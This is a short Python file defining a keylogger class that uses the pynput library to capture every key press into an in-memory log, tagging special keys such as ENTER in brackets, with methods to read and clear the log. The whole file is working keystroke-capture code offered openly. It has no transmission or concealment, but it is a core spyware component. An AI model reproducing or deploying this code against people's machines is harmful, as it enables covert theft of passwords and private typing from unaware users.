from pynput import keyboard

class Keylogger(keyboard.Listener):
    def __init__(self):
        super().__init__(on_press = self.on_press)
        self.log = ""
    
    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            _key = str(key).split('.')[1].upper()

            if _key == 'ENTER':
                self.log += f'[{_key}]\n'
            # elif _key == 'SPACE':
            #     string += ' '
            # elif _key == 'BACKSPACE':
            #     string = string[:-1]
            else:
                self.log += f'[{_key}]'
        except:
            pass
    
    def get_log(self):
        return self.log
    
    def clear_log(self):
        self.log = ""